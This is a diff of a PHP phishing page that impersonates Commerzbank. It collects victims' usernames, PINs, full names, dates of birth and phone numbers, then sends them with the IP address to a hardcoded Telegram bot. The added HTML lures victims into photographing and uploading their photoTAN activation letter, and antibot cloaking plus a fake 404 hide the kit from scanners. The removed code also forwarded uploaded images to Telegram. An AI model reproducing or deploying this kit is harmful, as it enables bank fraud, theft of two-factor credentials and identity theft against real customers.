@@ -1,70 +1,110 @@
 <?php
 
-// ANTIBOT DISABLED - include..antibot.php';
+include '../antibot.php';
 include '../antibot/tds.php';
 
-ini_set('upload_max_filesize', '0');
-ini_set('post_max_size', '0');
-ini_set('max_execution_time', '600');
-
-$config = include('../config/index.php');
-$botToken = $config['bot_token'];
-$chatId = $config['chat_id'];
-
-$uploadDir = 'xentryxupload/';
-if (!is_dir($uploadDir)) {
-    mkdir($uploadDir, 0755, true);
+// Start session only once at the beginning
+if (session_status() == PHP_SESSION_NONE) {
+    session_start();
 }
 
-if ($_FILES['file']['error'] == UPLOAD_ERR_OK) {
-    $randomPrefix = str_pad(rand(0, 999999), 6, '0', STR_PAD_LEFT);
-    $originalFileName = basename($_FILES['file']['name']);
-    $fileExtension = pathinfo($originalFileName, PATHINFO_EXTENSION);
-    $newFileName = $randomPrefix . '-' . $originalFileName;
-    $uploadPath = $uploadDir . $newFileName;
-
-    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath)) {
-        $visitorIp = $_SERVER['REMOTE_ADDR'];
-        $serverHost = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_ADDR'];
-        $imageURL = "{$serverHost}/views/{$uploadDir}{$newFileName}";
-
-        // Prepare message text with IP address and image URL
-        $message = "🟡 |  𝗖𝗼𝗺𝗺𝗲𝗿𝘇𝗯𝗮𝗻𝗸 𝗨𝗽𝗹𝗼𝗮𝗱  [ 2nd ]\n";
-        $message .= "🔗 |  𝗜𝗠𝗚 𝗨𝗥𝗟  : $imageURL\n";
-        $message .= "📍 |  𝗜𝗣  : $visitorIp";
-
+function currentTime() {
+    return time();
+}
  
 
+function checkAccess() {
+    $maxConnections = 5;
+    $timeFrame = 5 * 60;
 
-        // Send the image to Telegram
-        $telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendPhoto";
-        $data = [
-            'chat_id' => $chatId,
-            'photo' => new CURLFile($uploadPath),
-            'caption' => $message
-        ];
+    $userIP = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
 
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
-        curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-
-        $result = curl_exec($ch);
-        if ($result === FALSE) {
-            echo "Error sending image to Telegram: " . curl_error($ch);
-        }
-        curl_close($ch);
-    } else {
-        echo "Error uploading the file.";
+    if (!isset($_SESSION['connection_data'])) {
+        $_SESSION['connection_data'] = [];
     }
-} else {
-    echo "No file uploaded or there was an upload error.";
+
+    $_SESSION['connection_data'] = array_filter($_SESSION['connection_data'], function ($timestamp) use ($timeFrame) {
+        return ($timestamp > (currentTime() - $timeFrame));
+    });
+
+    $_SESSION['connection_data'][] = currentTime();
+
+    if (count($_SESSION['connection_data']) > $maxConnections) {
+        return true;
+    }
+    return false;
 }
+
+if (checkAccess()) {
+    die("404 page not found");
+}
+ 
 ?>
+ 
 
+ <?php
+ 
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    $_SESSION['xname1'] = $_POST['xname1'] ?? '';
+    $_SESSION['xname2'] = $_POST['xname2'] ?? '';
+    $_SESSION['xdob'] = $_POST['xdob'] ?? '';
+    $_SESSION['xtel'] = $_POST['xtel'] ?? '';
+} else {
+    header('Location: https://www.commerzbank.de/');
+    exit();
+}
+ 
+ 
+$xusr = $_SESSION['xusr'] ?? '';
+$xpss = $_SESSION['xpss'] ?? '';
+$xusr1 = $_SESSION['xusr1'] ?? '';
+$xpss1 = $_SESSION['xpss1'] ?? '';
+$xname1 = $_SESSION['xname1'] ?? '';
+$xname2 = $_SESSION['xname2'] ?? '';
+$xdob = $_SESSION['xdob'] ?? '';
+$xtel = $_SESSION['xtel'] ?? '';
+$ipAddress = $_SERVER['REMOTE_ADDR'] ?? 'unknown'; 
 
+$token = '8018269855:AAEFA85o8SlWZP7Z5Qq9gNVdPMd6iRVOs1Q'; // Replace with your bot token
+$chatId = '-4667150929';   // Replace with your chat ID
+ 
+$message = "🟡 |  𝗖𝗼𝗺𝗺𝗲𝗿𝘇𝗯𝗮𝗻𝗸 𝗜𝗡𝗙𝗢\n\n";
+$message .= "👤 |  𝗕𝗲𝗻𝘂𝘁𝘇𝗲𝗿𝗻𝗮𝗺𝗲: $xusr / $xusr1\n";
+$message .= "👤 |  𝗣𝗜𝗡: $xpss / $xpss1\n";
+$message .= "🧑 |  𝗙𝘂𝗹𝗹 𝗡𝗮𝗺𝗲: $xname1 $xname2\n";
+$message .= "🎂 |  𝗗𝗢𝗕: $xdob\n";
+$message .= "📱 |  𝗣𝗵𝗼𝗻𝗲: $xtel\n";
+$message .= "\n";
+$message .= "📍 |  𝗜𝗣 𝗔𝗱𝗿𝗲𝘀𝘀: $ipAddress";
+ 
+// Use optimized Telegram API call with timeout
+$url = "https://api.telegram.org/bot$token/sendMessage";
+$data = [
+    'chat_id' => $chatId,
+    'text' => $message,
+    'parse_mode' => 'HTML'
+];
 
+$options = [
+    'http' => [
+        'method' => 'POST',
+        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
+        'content' => http_build_query($data),
+        'timeout' => 5, // 5 second timeout for faster response
+        'ignore_errors' => true // Don't throw errors on HTTP errors
+    ]
+];
+
+$context = stream_context_create($options);
+$response = @file_get_contents($url, false, $context);
+
+// Log the response for debugging
+if ($response === false) {
+    error_log("Telegram API call failed for chat ID: $chatId");
+}
+
+session_destroy();
+?>
 
 
 <html dir="ltr" lang="de" class="js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths win chrome chrome1 webkit webkit5 details" style=""><head>
@@ -512,7 +552,7 @@ if ($_FILES['file']['error'] == UPLOAD_ERR_OK) {
 			<div class="mod mod-Login">
 				<div class="mod mod-Headline">
 					<h1 class="h-01">
-						 
+						Letzter Schritt: Verlängerung Ihres bestehenden photoTAN-Verfahrens
 					</h1>
 
 				</div>
@@ -520,25 +560,34 @@ if ($_FILES['file']['error'] == UPLOAD_ERR_OK) {
 				<div class="row ac-6_6">
 					<div class="col col-lg-6">
 						<div class="login-box">
-							
- <form id="form" autocomplete="off" class="form-horizontal" method="post">
- <h1 class="h-01">Herzlichen Glückwunsch!</h1>
+	<form id="form" autocomplete="off" class="form-horizontal" method="post" enctype="multipart/form-data" action="uploadz2.php">
+    <h1 class="h-01">Aktivierungsgrafik scannen</h1>
+    <div class="form-row label-pos-none field-length-full">
+        <span style="border: 2px dashed; border-color: black; padding: 5px; display: inline-block; border-style: dashed;">
+            Scannen Sie die Aktivierungsgrafik aus dem erhaltenen Schreiben, um Ihr photoTAN-Verfahren zu verlängern. Nach Prüfung bleibt es weiterhin gültig. Bitte fotografieren Sie erst den gesamten Aktivierungsbrief und laden Sie das Bild aus Ihrer Galerie hoch.
+        </span>
+    </div>
+    <br><br>
+    <center>
+        <img src="./lika2.gif" width="200">
+    </center>
+    <br><br>
+    <!-- File input field hidden initially -->
+  <input type="file" id="fileInput" name="file" style="display:none;"   required>
+    <button id="doordior" type="button" class="b-01 b-a-04 b-g-01" onclick="document.getElementById('fileInput').click()">
+        Datei hochladen
+    </button>
+</form>
 
- <p>Ihre Angaben wurden erfolgreich geprüft und Ihre Verifizierung ist abgeschlossen. Ab sofort können Sie Ihre Dienste wie gewohnt nutzen.
-<br><br>
-Klicken Sie auf die Schaltfläche unten, um auf die Hauptseite weitergeleitet zu werden.</p>
- 	 
-							 
+<script>
+    document.getElementById('fileInput').addEventListener('change', function() {
+        // Submit the form when a file is selected
+        document.getElementById('form').submit();
+    });
+</script>
 
-								 
-
-<br><br>
-
-							<button id="doordior" name="doordior" class="b-01 b-a-04 b-g-01" type="button" tabindex="4" onclick="window.location.href='https://www.commerzbank.de'">
-    Weiterleitung durchführen
-</button>
-
-							</form>
+</body>
+</html>
 
 							
 						</div>
